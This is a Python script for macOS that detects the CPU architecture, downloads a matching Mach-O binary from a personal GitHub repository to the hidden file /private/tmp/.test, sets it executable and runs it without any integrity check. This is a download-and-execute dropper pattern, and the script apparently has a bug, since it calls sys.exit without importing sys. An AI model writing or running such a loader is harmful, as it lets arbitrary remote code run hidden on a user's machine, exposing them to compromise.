#!/usr/bin/env python3

import os
import subprocess
import urllib.request
import platform

arch = platform.machine()
binary_url = ""

if arch == "arm64":
    binary_url = "https://raw.githubusercontent.com/S-MaN14th/test/refs/heads/main/test-macho-ARM64"
elif arch == "x86_64":
    binary_url = "https://raw.githubusercontent.com/S-MaN14th/test/refs/heads/main/test-macho"
else:
    print(f"Unknown architecture: {arch}")
    exit()

print (binary_url)

destination_path = "/private/tmp/.test"

try:
    os.makedirs(os.path.dirname(destination_path), exist_ok=True)

    print(f"Downloading binary from {binary_url} to {destination_path}")
    urllib.request.urlretrieve(binary_url, destination_path)

    print(f"Setting permissions for {destination_path}")
    os.chmod(destination_path, 0o755)

    result = subprocess.run([destination_path], capture_output=True)

    if result.returncode == 0:
        print("Binary executed successfully.")
    else:
        print(f"Execution failed with return code {result.returncode}. Error: {result.stderr.decode()}")

except subprocess.CalledProcessError as e:
    print(f"Execution failed with return code {e.returncode}. Error: {e.stderr.decode() if e.stderr else 'No stderr'}")
    sys.exit(e.returncode)
except Exception as e:
    print(f"Unexpected error: {e}")
    sys.exit(1)
